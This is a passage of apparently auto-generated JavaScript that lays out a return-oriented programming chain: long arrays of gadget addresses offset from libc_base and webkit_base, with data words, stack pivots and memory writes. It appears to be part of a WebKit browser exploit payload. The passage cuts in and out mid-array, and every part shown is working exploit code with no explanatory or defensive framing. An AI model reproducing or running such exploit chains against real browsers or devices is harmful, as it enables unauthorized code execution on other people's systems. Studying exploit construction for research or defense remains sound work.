libc_base+713278, //pop rsi
ropchain+136528, //L1830
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+136576, //L1833
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+136544, //L1831
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1830:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1831:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
//L1832:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1833:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+350006, //setne al
libc_base+232261, //movzx eax, al
libc_base+713278, //pop rsi
ropchain+136648, //L1834
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1834:
db([0, 0]); // 0x0
//L1789:
set_gadgets([
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+136760, //L1836
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+136792, //L1838
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+136776, //L1837
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1836:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1837:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1838:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+136904, //L1839
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+136952, //L1842
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+136920, //L1840
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1839:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1840:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
//L1841:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1842:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+350006, //setne al
libc_base+232261, //movzx eax, al
libc_base+713278, //pop rsi
ropchain+137024, //L1843
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1843:
db([0, 0]); // 0x0
//L1736:
set_gadgets([
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+137136, //L1845
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+137168, //L1847
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+137152, //L1846
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1845:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1846:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1847:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+137312, //L1851
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+137328, //L1852
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+137296, //L1850
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L1849:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1850:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1851:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1852:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+232261, //movzx eax, al
webkit_base+426067, //shl rax, 3
libc_base+713278, //pop rsi
ropchain+137440, //L1853+8
libc_base+507828, //add rax, rsi
libc_base+145226, //mov rax, [rax]
libc_base+713278, //pop rsi
ropchain+137432, //L1853
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+489696 //pop rsp
]);
//L1853:
db([0, 0]); // 0x0
set_gadgets([
ropchain+137456, //L1853+24
ropchain+139800, //L1848
libc_base+713278, //pop rsi
ropchain+137512, //L1855
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1854:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1855:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+137616, //L1858
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+137600, //L1857
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1857:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1858:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+137776, //L1861
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+137808, //L1863
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+137760, //L1860
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+137792, //L1862
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1860:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1861:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1862:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1863:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+137888, //L1864
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+137904, //L1865
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1864:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1865:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+138064, //L1869
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+138032, //L1867
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+138048, //L1868
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1866:
db([56, 0]); // 0x38
set_gadget(libc_base+165442,); //pop rdi
//L1867:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1868:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1869:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+138168, //L1871
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+138152, //L1870
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1870:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1871:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+138264, //L1873
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1872:
db([24, 0]); // 0x18
set_gadget(libc_base+772328,); //pop rcx
//L1873:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+138368, //L1876
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+138352, //L1875
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1875:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1876:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+138448, //L1878
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+138464, //L1879
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1878:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1879:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+138608, //L1882
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+138576, //L1880
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+138592, //L1881
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1880:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1881:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1882:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+138696, //L1884
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L1883:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L1884:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+138800, //L1886
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1885:
db([24, 0]); // 0x18
set_gadget(libc_base+772328,); //pop rcx
//L1886:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+138904, //L1889
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+138888, //L1888
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1888:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1889:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+138992, //L1891
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+139008, //L1892
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
//L1891:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1892:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+139064, //L1894
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1894:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+139184, //L1896
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1896:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+139240, //L1898
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1898:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+887232, //mov [rax], cl
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+139384, //L1902
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+139368, //L1901
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1900:
db([56, 0]); // 0x38
set_gadget(webkit_base+3789839,); //pop r11
//L1901:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1902:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+139504, //L1903
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+139536, //L1905
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+139520, //L1904
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1903:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1904:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1905:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+139640, //L1906
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+139656, //L1907
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L1906:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1907:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+139776, //L1908
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+139760, //L1909
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1909:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L1908:
db([0, 0]); // 0x0
set_gadgets([
libc_base+489696, //pop rsp
ropchain+141248, //L1910
//L1848:
libc_base+713278, //pop rsi
ropchain+139856, //L1912
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1911:
db([24, 0]); // 0x18
set_gadget(libc_base+772328,); //pop rcx
//L1912:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+139960, //L1915
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+139944, //L1914
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1914:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1915:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+140104, //L1919
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+140072, //L1917
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+140088, //L1918
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1917:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1918:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1919:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+140200, //L1921
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1920:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1921:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+140304, //L1924
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+140288, //L1923
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1923:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1924:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+140464, //L1927
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+140496, //L1929
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+140448, //L1926
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+140480, //L1928
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1926:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1927:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1928:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1929:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+140592, //L1931
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+140576, //L1930
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1930:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1931:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L1933:
ropchain+140696, //L1932
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+141576, //L1934
//L1932:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+140824, //L1935
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+140856, //L1937
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+140840, //L1936
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1935:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1936:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1937:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+140968, //L1938
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+141000, //L1940
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+140984, //L1939
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1938:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1939:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1940:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+141104, //L1941
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+141120, //L1942
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L1941:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1942:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+141240, //L1943
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+141224, //L1944
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1944:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L1943:
db([0, 0]); // 0x0
//L1910:
set_gadgets([
libc_base+713278, //pop rsi
ropchain+141328, //L1946
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+141312, //L1945
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1945:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1946:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+141432, //L1947
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+141448, //L1948
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L1947:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1948:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+141568, //L1949
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+141552, //L1950
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1950:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L1949:
db([0, 0]); // 0x0
//L1934:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
